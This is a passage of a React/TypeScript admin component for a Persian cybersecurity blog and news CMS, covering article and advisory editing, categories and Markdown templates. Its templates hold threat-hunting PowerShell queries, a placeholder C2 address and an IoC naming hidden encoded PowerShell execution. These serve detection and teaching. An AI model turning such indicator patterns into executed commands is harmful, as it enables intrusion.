"use client";

import React, { useState, useEffect } from "react";
import {
  FileText,
  Radio,
  Plus,
  Edit3,
  Trash2,
  Check,
  X,
  Eye,
  Star,
  Flame,
  RotateCcw,
  Save,
  CheckCircle2,
  AlertCircle,
  PlusCircle,
  MinusCircle,
  ExternalLink,
  FolderTree,
  Tag,
  Layers,
  Heading,
  Bold,
  Code,
  Table as TableIcon,
  Quote,
  List,
  ListOrdered,
  Link2,
  Columns,
  SplitSquareVertical,
  AlertTriangle,
  Sparkles,
  Terminal,
} from "lucide-react";
import {
  BlogPost,
  BlogSectionItem,
  NewsArticle,
  NewsSectionItem,
  NewsIoC,
  ContentCategory,
  DEFAULT_CATEGORIES,
  fetchContentStore,
  adminSaveBlogPost,
  adminDeleteBlogPost,
  adminSaveNewsArticle,
  adminDeleteNewsArticle,
  adminSaveCategory,
  adminDeleteCategory,
  adminResetDefaultContent,
  adminUpsertContent,
  reconstructBlogMarkdown,
  reconstructNewsMarkdown,
  UpsertContentPayload,
} from "@/lib/contentStore";
import { MarkdownPreview } from "./MarkdownPreview";

interface AdminContentManagerProps {
  onOpenBlogPost?: (slug: string) => void;
  onOpenNewsArticle?: (slug: string) => void;
  portalTheme?: "light" | "dark";
}

export const AdminContentManager: React.FC<AdminContentManagerProps> = ({
  onOpenBlogPost,
  onOpenNewsArticle,
  portalTheme = "light",
}) => {
  const [cmsSubTab, setCmsSubTab] = useState<"blog" | "news" | "categories">("blog");
  const [blogPosts, setBlogPosts] = useState<BlogPost[]>([]);
  const [newsArticles, setNewsArticles] = useState<NewsArticle[]>([]);
  const [categories, setCategories] = useState<ContentCategory[]>(DEFAULT_CATEGORIES);
  const [loading, setLoading] = useState<boolean>(true);
  const [saving, setSaving] = useState<boolean>(false);
  const [feedback, setFeedback] = useState<{ type: "success" | "error"; text: string } | null>(
    null
  );

  // Editor state
  const [editingBlog, setEditingBlog] = useState<BlogPost | null>(null);
  const [editingNews, setEditingNews] = useState<NewsArticle | null>(null);
  const [editingCategory, setEditingCategory] = useState<ContentCategory | null>(null);
  const [isNewCategoryModal, setIsNewCategoryModal] = useState<boolean>(false);
  const [editorViewMode, setEditorViewMode] = useState<"split" | "edit" | "preview">("split");

  useEffect(() => {
    let cancelled = false;
    fetchContentStore().then((res) => {
      if (!cancelled) {
        setBlogPosts(res.blogPosts || []);
        setNewsArticles(res.newsArticles || []);
        if (res.categories && res.categories.length > 0) {
          setCategories(res.categories);
        }
        setLoading(false);
      }
    });
    return () => {
      cancelled = true;
    };
  }, []);

  const showToast = (type: "success" | "error", text: string) => {
    setFeedback({ type, text });
    setTimeout(() => setFeedback(null), 4000);
  };

  // ============================================================================
  // CATEGORIES CRUD HANDLERS
  // ============================================================================
  const handleStartNewCategory = () => {
    setEditingCategory({
      id: `cat-${Date.now()}`,
      name: "",
      slug: "",
      description: "",
      targetType: "all",
    });
    setIsNewCategoryModal(true);
  };

  const handleSaveCategory = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingCategory || !editingCategory.name.trim()) {
      showToast("error", "لطفاً نام دسته‌بندی را وارد نمایید.");
      return;
    }

    setSaving(true);
    try {
      const slug =
        editingCategory.slug.trim() ||
        editingCategory.name
          .trim()
          .toLowerCase()
          .replace(/\s+/g, "-")
          .replace(/[^a-z0-9-]/g, "") ||
        `cat-${Date.now().toString().slice(-4)}`;

      const cleanCat: ContentCategory = {
        ...editingCategory,
        slug,
        targetType: editingCategory.targetType || "all",
      };

      const res = await adminSaveCategory(cleanCat);
      if (res.ok) {
        setCategories(res.categories);
        setEditingCategory(null);
        setIsNewCategoryModal(false);
        showToast("success", res.message || "دسته‌بندی با موفقیت ذخیره شد.");
      } else {
        showToast("error", res.error || "خطا در ذخیره دسته‌بندی.");
      }
    } catch {
      showToast("error", "خطای شبکه هنگام ارتباط با سرور.");
    } finally {
      setSaving(false);
    }
  };

  const handleDeleteCategory = async (catId: string) => {
    if (!confirm("آیا از حذف این دسته‌بندی اطمینان دارید؟")) return;
    setSaving(true);
    try {
      const res = await adminDeleteCategory(catId);
      setCategories(res.categories);
      showToast("success", "دسته‌بندی با موفقیت حذف شد.");
    } catch {
      showToast("error", "خطا در حذف دسته‌بندی.");
    } finally {
      setSaving(false);
    }
  };

  // ============================================================================
  // MARKDOWN TOOLBAR HELPER
  // ============================================================================
  const insertMarkdownSnippet = (
    type: "h2" | "h3" | "bold" | "code_inline" | "code_block" | "table" | "callout" | "bullet" | "numbered" | "link",
    target: "blog" | "news"
  ) => {
    let snippet = "";
    switch (type) {
      case "h2":
        snippet = "\n## عنوان بخش جدید تحلیلی\n";
        break;
      case "h3":
        snippet = "\n### زیرعنوان فنی بخش\n";
        break;
      case "bold":
        snippet = "**متن پررنگ**";
        break;
      case "code_inline":
        snippet = "`دستور یا نام متغیر`";
        break;
      case "code_block":
        snippet = "\n```powershell\n# کوئری پایش یا اسکریپت تحلیل\nGet-Process | Where-Object { $_.Path -like \"*AppData*\" }\n```\n";
        break;
      case "table":
        snippet = "\n| شاخص / مولفه | مقدار | وضعیت / تحلیل |\n|---|---|---|\n| C2 Server | 198.51.100.45:443 | فعال در پویش‌ها |\n| User-Agent | Mozilla/5.0 ... | مشکوک |\n";
        break;
      case "callout":
        snippet = "\n> ⚠️ **هشدار امنیتی:** بررسی مداوم پردازه‌های مورد اعتماد مرورگر و جلوگیری از تزریق DLL الزامی است.\n";
        break;
      case "bullet":
        snippet = "\n- اقدام دفاعی اول\n- اقدام دفاعی دوم\n- اقدام دفاعی سوم\n";
        break;
      case "numbered":
        snippet = "\n1. گام اول: جداسازی هاست از شبکه\n2. گام دوم: جمع‌آوری دامپ حافظه\n3. گام سوم: تحلیل ترافیک DNS\n";
        break;
      case "link":
        snippet = "[عنوان منبع تحلیل](https://roham.cyber/research)";
        break;
    }

    if (target === "blog" && editingBlog) {
      const current = editingBlog.bodyMarkdown || "";
      setEditingBlog({
        ...editingBlog,
        bodyMarkdown: current + snippet,
      });
    } else if (target === "news" && editingNews) {
      const current = editingNews.bodyMarkdown || "";
      setEditingNews({
        ...editingNews,
        bodyMarkdown: current + snippet,
      });
    }
  };

  // ============================================================================
  // BLOG CRUD HANDLERS (v2 Markdown & upsert_content)
  // ============================================================================
  const handleStartNewBlog = () => {
    const nowId = `post-${Date.now()}`;
    const defaultMarkdown = `## ۱. کالبدشکافی معماری و روش‌های نفوذ

در این بخش مکانیزم عملکرد و نحوه دور زدن تمهیدات دفاعی را واکاوی می‌کنیم. بدافزارهای استیلر مدرن از تکنیک‌های نوین تزریق کد و فراخوانی APIهای سیستمی استفاده می‌کنند.

\`\`\`powershell
# نمونه کوئری بررسی وضعیت پردازه‌های مشکوک در سیستم
Get-Process | Where-Object { $_.Path -like "*\\AppData\\Local\\*" }
\`\`\`

> ⚠️ **هشدار امنیتی:** بررسی مداوم پردازه‌های مورد اعتماد مرورگر و جلوگیری از تزریق کد به حافظه حیاتی است.

## ۲. روش‌های تشخیص و شکار تهدید (Threat Hunting)

تحلیلگران مرکز عملیات امنیت (SOC) باید الگوهای زیر را در لاگ‌های EDR و SIEM پایش نمایند:

- فراخوانی غیرعادی APIهای ایجاد پردازه (Process Creation)
- خواندن غیرمجاز حافظه پردازه‌های مرورگر
- اتصالات شبکه مشکوک به دامنه‌های با شهرت پایین (Low Reputation)

| تکنیک MITRE | شناسه | نام تکنیک |
|---|---|---|
| Injection | T1055 | Process Injection |
| Credentials | T1555 | Credentials from Password Stores |
| Defense Evasion | T1562 | Impair Defenses |
`;

    setEditingBlog({
      id: nowId,
      title: "",
      subtitle: "",
      slug: `roham-article-${Date.now().toString().slice(-5)}`,
      summary: "",
      category: "استیلر و بدافزار",
      categoryId: "malware-infostealers",
      readTime: "۸ دقیقه",
      readTimeMinutes: 8,
      date: new Date().toLocaleDateString("fa-IR", { month: "long", year: "numeric" }),
      publishedAt: new Date().toISOString(),
      author: "تیم پژوهش امنیت سایبری رهام",
      authorRole: "Roham Threat Research Labs",
      difficulty: "تخصصی (Deep-Dive)",
      keywords: ["Infostealer", "Chromium", "Defense"],
      tags: ["Infostealer", "Chromium", "Defense"],
      status: "published",
      isFeatured: false,
      views: 1,
      relatedChapterId: "chapter-1",
      bodyMarkdown: defaultMarkdown,
      tldr: [
        "نکته کلیدی اول خلاصه مدیریتی مقاله در اینجا قرار می‌گیرد.",
        "نکته کلیدی دوم جهت مطالعه سریع مدیران امنیت.",
      ],
      takeaways: [
        "اعمال پیکربندی سخت‌گیرانه در مرورگرها و نقاط انتهایی",
        "فعال‌سازی احراز هویت چندعاملی مبتنی بر سخت‌افزار (FIDO2)",
      ],
      references: [
        {
          title: "Roham Threat Research Labs Archive",
          url: "https://roham.cyber/research",
        },
      ],
      content: {
        intro: "",
        sections: [],
        conclusion: "",
        actionableTakeaways: [],
      },
    });
    setEditorViewMode("split");
  };

  const handleOpenEditBlog = (post: BlogPost) => {
    const bodyMarkdown = reconstructBlogMarkdown(post);
    setEditingBlog({
      ...post,
      bodyMarkdown,
      tags: post.tags || post.keywords || [],
      keywords: post.keywords || post.tags || [],
      takeaways: post.takeaways || post.content?.actionableTakeaways || [],
    });
    setEditorViewMode("split");
  };

  const handleSaveBlog = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingBlog) return;
    if (!editingBlog.title.trim() || !editingBlog.summary.trim()) {
      showToast("error", "لطفاً عنوان و خلاصه مقاله را وارد نمایید.");
      return;
    }
    if (!editingBlog.bodyMarkdown || !editingBlog.bodyMarkdown.trim()) {
      showToast("error", "لطفاً متن اصلی مقاله (Markdown) را وارد نمایید.");
      return;
    }

    setSaving(true);
    const selectedCat = categories.find((c) => c.name === editingBlog.category || c.slug === editingBlog.categoryId);
    const categoryId = selectedCat?.slug || editingBlog.categoryId || "malware-infostealers";
    const slug = editingBlog.slug.trim() || `article-${Date.now().toString().slice(-6)}`;

    const payload: UpsertContentPayload = {
      action: "upsert_content",
      type: "blog",
      content: {
        slug,
        title: editingBlog.title.trim(),
        subtitle: editingBlog.subtitle?.trim() || "",
        summary: editingBlog.summary.trim(),
        categoryId,
        tags: (editingBlog.tags || editingBlog.keywords || []).map((t) => t.trim()).filter(Boolean),
        status: editingBlog.status,
        publishedAt: editingBlog.publishedAt || new Date().toISOString(),
        author: {
          name: editingBlog.author || "تیم پژوهش امنیت سایبری رهام",
          role: editingBlog.authorRole || "Roham Threat Research Labs",
        },
        difficulty: editingBlog.difficulty || "تخصصی (Deep-Dive)",
        readTimeMinutes: typeof editingBlog.readTimeMinutes === "number" ? editingBlog.readTimeMinutes : parseInt(editingBlog.readTime) || 8,
        isFeatured: !!editingBlog.isFeatured,
        tldr: (editingBlog.tldr || []).map((t) => t.trim()).filter(Boolean),
        takeaways: (editingBlog.takeaways || editingBlog.content?.actionableTakeaways || []).map((t) => t.trim()).filter(Boolean),
        references: editingBlog.references || [],
        bodyMarkdown: editingBlog.bodyMarkdown.trim(),
      },
    };

    const res = await adminUpsertContent(payload);
    setSaving(false);
    if (res.ok) {
      if (res.blogPosts) setBlogPosts(res.blogPosts);
      setEditingBlog(null);
      showToast("success", res.message || "مقاله وبلاگ با موفقیت در دیتابیس ثبت و منتشر شد.");
    } else {
      showToast("error", res.error || "خطا در ذخیره مقاله");
    }
  };

  const handleDeleteBlog = async (id: string) => {
    const res = await adminDeleteBlogPost(id);
    if (res.ok) {
      if (res.blogPosts) setBlogPosts(res.blogPosts);
      showToast("success", "مقاله وبلاگ با موفقیت حذف شد.");
    }
  };

  const handleToggleBlogStatus = async (post: BlogPost) => {
    const updated: BlogPost = {
      ...post,
      status: post.status === "published" ? "draft" : "published",
    };
    const res = await adminSaveBlogPost(updated);
    if (res.ok) {
      if (res.blogPosts) setBlogPosts(res.blogPosts);
      showToast(
        "success",
        updated.status === "published"
          ? "مقاله در وبلاگ عمومی منتشر شد."
          : "مقاله به حالت پیش‌نویس تغییر یافت."
      );
    }
  };

  // ============================================================================
  // NEWS CRUD HANDLERS (v2 Markdown & upsert_content)
  // ============================================================================
  const handleStartNewNews = () => {
    const nowId = `news-${Date.now()}`;
    const defaultMarkdown = `## ۱. کالبدشکافی فنی حمله و بردار نفوذ

حملات گسترده با استفاده از بردار نفوذ جدید و زنجیره اکسپلویت بحرانی در حیات‌وحش سایبری رصد شده است. مهاجمان با سوءاستفاده از این آسیب‌پذیری به اطلاعات احراز هویت و نشست‌های کاربری دست می‌یابند.

\`\`\`powershell
# بررسی ردپای ارتباطات مشکوک به زیرساخت C2
Get-NetTCPConnection -State Established | Where-Object { $_.RemotePort -in @(443, 8443, 4444) }
\`\`\`

> ⚠️ **هشدار تحلیل تهدید:** این کمپین از تکنیک‌های مبهم‌سازی (Obfuscation) برای دور زدن آنتی‌ویروس‌ها استفاده می‌کند.

## ۲. راهکارهای مهار و امن‌سازی فوری

1. پایش و اعمال فوری آخرین وصله امنیتی منتشرشده
2. مسدودسازی شاخص‌های آلودگی (IoCs) در لایه فایروال و DNS
3. فعال‌سازی قابلیت EDR و بررسی لاگ‌های ایجاد پردازه
`;

    setEditingNews({
      id: nowId,
      slug: `security-advisory-${Date.now().toString().slice(-5)}`,
      title: "",
      subtitle: "",
      category: "urgent",
      categoryLabel: "هشدار فوری و فعال",
      categoryId: "security-alerts",
      severity: "CRITICAL",
      status: "published",
      isBreaking: false,
      date: new Date().toLocaleDateString("fa-IR", { month: "long", year: "numeric" }),
      publishedAt: new Date().toISOString(),
      readTime: "۵ دقیقه",
      readTimeMinutes: 5,
      author: "تحریریه امنیت سایبری و هوش تهدیدات رهام",
      source: "Roham Threat Intel / CERT",
      views: 1,
      cveIds: ["CVE-2026-XXXX"],
      cvssScore: "9.8",
      affectedProducts: ["Windows 10 / 11", "Chromium Browsers"],
      exploitStatus: "در حال بهره‌برداری فعال در حیات‌وحش",
      summary: "",
      bodyMarkdown: defaultMarkdown,
      keyHighlights: [
        "یافته کلیدی اول این گزارش خبری برای مدیران امنیت",
        "یافته کلیدی دوم در خصوص نحوه انتشار یا بهره‌برداری",
      ],
      iocs: [
        {
          type: "Process/Command",
          value: "powershell.exe -w hidden -enc ...",
          description: "الگوی اجرای دستور مشکوک در سیستم قربانی",
        },
      ],
      mitigationSteps: [
        "اعمال فوری آخرین وصله امنیتی منتشرشده توسط سازنده",
        "پایش لاگ‌های SIEM و مسدودسازی شاخص‌های آلودگی (IoCs)",
      ],
      timeline: [{ time: "مهر ۱۴۰۴", event: "ثبت و انتشار بولتن امنیتی در رادار رهام" }],
      keywords: ["ZeroDay", "SOC Alert", "ThreatHunting"],
      tags: ["ZeroDay", "SOC Alert", "ThreatHunting"],
      sections: [],
    });
    setEditorViewMode("split");
  };

  const handleOpenEditNews = (article: NewsArticle) => {
    const bodyMarkdown = reconstructNewsMarkdown(article);
    setEditingNews({
      ...article,
      bodyMarkdown,
      tags: article.tags || article.keywords || [],
      keywords: article.keywords || article.tags || [],
    });
    setEditorViewMode("split");
  };

  const handleSaveNews = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!editingNews) return;
    if (!editingNews.title.trim() || !editingNews.summary.trim()) {
      showToast("error", "لطفاً عنوان و خلاصه گزارش خبری را وارد نمایید.");
      return;
    }
    if (!editingNews.bodyMarkdown || !editingNews.bodyMarkdown.trim()) {
      showToast("error", "لطفاً متن اصلی خبر (Markdown) را وارد نمایید.");
      return;
    }

    setSaving(true);
    const selectedCat = categories.find((c) => c.name === editingNews.category || c.slug === editingNews.categoryId);
    const categoryId = selectedCat?.slug || editingNews.categoryId || "security-alerts";
    const slug = editingNews.slug.trim() || `news-${Date.now().toString().slice(-6)}`;

    const payload: UpsertContentPayload = {
      action: "upsert_content",
      type: "news",
      content: {
        slug,
        title: editingNews.title.trim(),
        subtitle: editingNews.subtitle?.trim() || "",
        summary: editingNews.summary.trim(),
        categoryId,
        tags: (editingNews.tags || editingNews.keywords || []).map((t) => t.trim()).filter(Boolean),
        severity: (editingNews.severity?.toLowerCase() as any) || "critical",
        isBreaking: !!editingNews.isBreaking,
        status: editingNews.status,
        publishedAt: editingNews.publishedAt || new Date().toISOString(),
        source: {
          name: editingNews.source || "Roham Threat Intel / CERT",
          url: editingNews.sourceUrl || "",
        },
        tldr: (editingNews.keyHighlights || []).map((t) => t.trim()).filter(Boolean),
        iocs: (editingNews.iocs || []).filter((i) => i.value.trim() !== ""),
        bodyMarkdown: editingNews.bodyMarkdown.trim(),
      },
    };

    const res = await adminUpsertContent(payload);
    setSaving(false);
    if (res.ok) {
      if (res.newsArticles) setNewsArticles(res.newsArticles);
      setEditingNews(null);
      showToast("success", res.message || "گزارش خبری با موفقیت در رادار تهدیدات ثبت شد.");
    } else {
      showToast("error", res.error || "خطا در ذخیره خبر");
    }
  };

  const handleDeleteNews = async (id: string) => {
    const res = await adminDeleteNewsArticle(id);
    if (res.ok) {
      if (res.newsArticles) setNewsArticles(res.newsArticles);
      showToast("success", "گزارش خبری از رادار حذف شد.");
    }
  };

  const handleToggleNewsStatus = async (article: NewsArticle) => {
    const updated: NewsArticle = {
      ...article,
      status: article.status === "published" ? "draft" : "published",
    };
    const res = await adminSaveNewsArticle(updated);
    if (res.ok) {
      if (res.newsArticles) setNewsArticles(res.newsArticles);
      showToast(
        "success",
        updated.status === "published"
          ? "خبر امنیتی در رادار منتشر شد."
          : "خبر به حالت پیش‌نویس تغییر یافت."
      );
    }
  };

  const handleResetAllDefaults = async () => {
    const res = await adminResetDefaultContent();
    setBlogPosts(res.blogPosts);
    setNewsArticles(res.newsArticles);
    showToast("success", "مقالات وبلاگ و اخبار امنیتی به محتوای استاندارد اولیه بازنشانی شدند.");
  };

  // ============================================================================
  // RENDER: BLOG POST EDITOR FORM (v2 Markdown & Live Preview)
  // ============================================================================
  if (editingBlog) {
    const blogMarkdownText = editingBlog.bodyMarkdown || "";
    const blogWordCount = blogMarkdownText.trim() ? blogMarkdownText.trim().split(/\s+/).length : 0;
    const blogCharCount = blogMarkdownText.length;
    const blogEstimatedMinutes = Math.max(1, Math.ceil(blogWordCount / 180));

    return (
      <div className="rounded-2xl bg-slate-900 border border-slate-800 p-6 space-y-6">
        {/* Editor Top Bar */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
          <div className="space-y-1">
            <div className="flex items-center gap-2.5">
              <FileText className="w-5 h-5 text-emerald-400" />
              <h2 className="text-base font-extrabold text-white">
                ویرایشگر مقالات وبلاگ تخصصی رهام (معماری مدرن Markdown)
              </h2>
              <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-mono text-[10px] font-bold border border-emerald-500/30">
                API v2.0
              </span>
            </div>
            <p className="text-xs text-slate-400">
              ویرایش یکپارچه متادیتا و متن Markdown با پیش‌نمایش بلادرنگ و ارسال مستقیم به اندپوینت استاندارد <code className="text-emerald-400 font-mono text-[11px]">upsert_content</code>
            </p>
          </div>

          <div className="flex items-center gap-2">
            {/* View Mode Switcher */}
            <div className="flex items-center p-1 rounded-xl bg-slate-950 border border-slate-800 text-xs">
              <button
                type="button"
                onClick={() => setEditorViewMode("split")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-bold transition-colors cursor-pointer ${
                  editorViewMode === "split"
                    ? "bg-emerald-500 text-slate-950 shadow-sm"
                    : "text-slate-400 hover:text-white"
                }`}
                title="نمای همزمان ادیتور و پیش‌نمایش"
              >
                <Columns className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">نمای دوگانه</span>
              </button>
              <button
                type="button"
                onClick={() => setEditorViewMode("edit")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-bold transition-colors cursor-pointer ${
                  editorViewMode === "edit"
                    ? "bg-emerald-500 text-slate-950 shadow-sm"
                    : "text-slate-400 hover:text-white"
                }`}
                title="فقط ویرایشگر متنی"
              >
                <Edit3 className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">ویرایشگر</span>
              </button>
              <button
                type="button"
                onClick={() => setEditorViewMode("preview")}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg font-bold transition-colors cursor-pointer ${
                  editorViewMode === "preview"
                    ? "bg-emerald-500 text-slate-950 shadow-sm"
                    : "text-slate-400 hover:text-white"
                }`}
                title="فقط پیش‌نمایش زنده"
              >
                <Eye className="w-3.5 h-3.5" />
                <span className="hidden sm:inline">پیش‌نمایش</span>
              </button>
            </div>

            <button
              onClick={() => setEditingBlog(null)}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold cursor-pointer"
            >
              <X className="w-4 h-4" />
              <span>انصراف</span>
            </button>
          </div>
        </div>

        <form onSubmit={handleSaveBlog} className="space-y-6 text-xs">
          {/* Metadata Card */}
          <div className="rounded-2xl bg-slate-950/70 border border-slate-800 p-5 space-y-4">
            <div className="flex items-center justify-between border-b border-slate-850 pb-3">
              <span className="text-xs font-extrabold text-slate-200 flex items-center gap-2">
                <Tag className="w-4 h-4 text-emerald-400" />
                <span>شناسنامه و متادیتای مقاله</span>
              </span>
              <span className="text-[11px] text-slate-400 font-mono">
                slug: /{editingBlog.slug || "..."}
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              <div className="md:col-span-2 space-y-1.5">
                <label className="font-bold text-slate-300 block">عنوان اصلی مقاله *</label>
                <input
                  type="text"
                  required
                  value={editingBlog.title}
                  onChange={(e) => setEditingBlog({ ...editingBlog, title: e.target.value })}
                  placeholder="مثال: کالبدشکافی عمیق روش‌های نوین بایپس App-Bound Encryption..."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-bold focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">دسته‌بندی تخصصی *</label>
                <select
                  value={editingBlog.category}
                  onChange={(e) => {
                    const selCat = categories.find((c) => c.name === e.target.value);
                    setEditingBlog({
                      ...editingBlog,
                      category: e.target.value,
                      categoryId: selCat?.slug || editingBlog.categoryId,
                    });
                  }}
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-emerald-500 focus:outline-none"
                >
                  {categories
                    .filter((c) => c.targetType === "all" || c.targetType === "blog")
                    .map((c) => (
                      <option key={c.id} value={c.name}>
                        {c.name}
                      </option>
                    ))}
                </select>
              </div>

              <div className="md:col-span-2 space-y-1.5">
                <label className="font-bold text-slate-300 block">زیرعنوان تحلیلی (Subtitle)</label>
                <input
                  type="text"
                  value={editingBlog.subtitle || ""}
                  onChange={(e) => setEditingBlog({ ...editingBlog, subtitle: e.target.value })}
                  placeholder="چگونه توسعه‌دهندگان بدافزار مکانیزم جدید کروم را دور می‌زنند؟"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-slate-200 focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">سطح دشواری فنی</label>
                <select
                  value={editingBlog.difficulty}
                  onChange={(e) =>
                    setEditingBlog({
                      ...editingBlog,
                      difficulty: e.target.value as BlogPost["difficulty"],
                    })
                  }
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-emerald-500 focus:outline-none"
                >
                  <option value="مقدماتی">مقدماتی</option>
                  <option value="متوسط">متوسط</option>
                  <option value="پیشرفته">پیشرفته</option>
                  <option value="تخصصی (Deep-Dive)">تخصصی (Deep-Dive)</option>
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">نامک آدرس مستقیم (URL Slug)</label>
                <input
                  type="text"
                  value={editingBlog.slug}
                  onChange={(e) => setEditingBlog({ ...editingBlog, slug: e.target.value })}
                  dir="ltr"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-emerald-400 font-mono text-left focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">نویسنده / پژوهشگاه</label>
                <input
                  type="text"
                  value={editingBlog.author}
                  onChange={(e) => setEditingBlog({ ...editingBlog, author: e.target.value })}
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">زمان تخمینی مطالعه</label>
                <input
                  type="text"
                  value={editingBlog.readTime}
                  onChange={(e) => setEditingBlog({ ...editingBlog, readTime: e.target.value })}
                  placeholder="مثال: ۱۱ دقیقه"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="md:col-span-3 space-y-1.5">
                <label className="font-bold text-slate-300 block">
                  تگ‌ها و کلیدواژه‌ها (جداشده با کاما انگلیسی ,)
                </label>
                <input
                  type="text"
                  value={(editingBlog.tags || editingBlog.keywords || []).join(", ")}
                  onChange={(e) => {
                    const items = e.target.value.split(",").map((s) => s.trim()).filter(Boolean);
                    setEditingBlog({
                      ...editingBlog,
                      tags: items,
                      keywords: items,
                    });
                  }}
                  dir="ltr"
                  placeholder="AppBoundEncryption, Chromium, Infostealer, DPAPI"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3.5 py-2.5 text-emerald-400 font-mono text-left focus:border-emerald-500 focus:outline-none"
                />
              </div>
            </div>

            {/* Status & Featured Toggles */}
            <div className="flex flex-wrap items-center gap-6 pt-3 border-t border-slate-855">
              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={editingBlog.status === "published"}
                  onChange={(e) =>
                    setEditingBlog({
                      ...editingBlog,
                      status: e.target.checked ? "published" : "draft",
                    })
                  }
                  className="w-4 h-4 accent-emerald-500 rounded"
                />
                <span className="font-bold text-slate-200">
                  انتشار عمومی فوری در وبلاگ (Published)
                </span>
              </label>

              <label className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={editingBlog.isFeatured}
                  onChange={(e) =>
                    setEditingBlog({ ...editingBlog, isFeatured: e.target.checked })
                  }
                  className="w-4 h-4 accent-amber-500 rounded"
                />
                <span className="font-bold text-amber-300 flex items-center gap-1">
                  <Star className="w-3.5 h-3.5 text-amber-400" />
                  <span>نمایش در باکس ویژه سرخط (Featured Spotlight)</span>
                </span>
              </label>
            </div>

            {/* Summary & TL;DR Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div className="space-y-1.5">
                <label className="font-bold text-slate-300 block">
                  چکیده کوتاه مقاله (نمایش در کارت‌های وبلاگ) *
                </label>
                <textarea
                  rows={3}
                  required
                  value={editingBlog.summary}
                  onChange={(e) => setEditingBlog({ ...editingBlog, summary: e.target.value })}
                  placeholder="خلاصه دو یا سه جمله‌ای برای معرفی مقاله در لیست مقالات..."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-slate-200 leading-relaxed focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="space-y-1.5">
                <label className="font-bold text-emerald-400 block">
                  خلاصه مدیریتی (TL;DR — هر خط یک نکته کلیدی)
                </label>
                <textarea
                  rows={3}
                  value={(editingBlog.tldr || []).join("\n")}
                  onChange={(e) =>
                    setEditingBlog({ ...editingBlog, tldr: e.target.value.split("\n") })
                  }
                  placeholder="تکنیک‌های قدیمی DPAPI منسوخ شده‌اند.&#10;استیلرها با تزریق کد کلید را از حافظه استخراج می‌کنند."
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-slate-200 leading-relaxed focus:border-emerald-500 focus:outline-none"
                />
              </div>

              <div className="md:col-span-2 space-y-1.5">
                <label className="font-bold text-emerald-400 block">
                  چک‌لیست دفاعی و اقدامات کلیدی (Takeaways — هر خط یک مورد)
                </label>
                <textarea
                  rows={2}
                  value={(editingBlog.takeaways || editingBlog.content?.actionableTakeaways || []).join("\n")}
                  onChange={(e) =>
                    setEditingBlog({
                      ...editingBlog,
                      takeaways: e.target.value.split("\n"),
                      content: {
                        ...editingBlog.content,
                        actionableTakeaways: e.target.value.split("\n"),
                      },
                    })
                  }
                  placeholder="محدودسازی دسترسی به دایرکتوری User Data مرورگر&#10;کوتاه کردن طول عمر کوکی‌ها و پیاده‌سازی DPoP"
                  className="w-full bg-slate-900 border border-slate-800 rounded-xl p-3 text-slate-200 leading-relaxed focus:border-emerald-500 focus:outline-none"
                />
              </div>
            </div>
          </div>

          {/* Core Markdown Workspace Container */}
          <div className="space-y-3">
            <div className="flex flex-wrap items-center justify-between gap-3">
              <div className="flex items-center gap-2">
                <span className="text-sm font-extrabold text-white">
                  بدنه اصلی مقاله (Markdown Body)
                </span>
                <span className="text-[11px] font-mono text-slate-400">
                  {blogWordCount} کلمه · {blogCharCount} کاراکتر · مطالعه حدود {blogEstimatedMinutes} دقیقه
                </span>
              </div>

              {/* Fast Markdown Toolbar */}
              <div className="flex flex-wrap items-center gap-1.5 bg-slate-950 p-1.5 rounded-xl border border-slate-800 text-xs">
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("h2", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 font-bold cursor-pointer"
                  title="تیتر سطح ۲"
                >
                  ## تیتر ۲
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("h3", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 font-bold cursor-pointer"
                  title="تیتر سطح ۳"
                >
                  ### تیتر ۳
                </button>
                <button
                  type="button"
                  onClick={() => insertMarkdownSnippet("bold", "blog")}
                  className="px-2 py-1 rounded bg-slate-900 hover:bg-slate-800 text-slate-300 font-bold cursor-pointer"
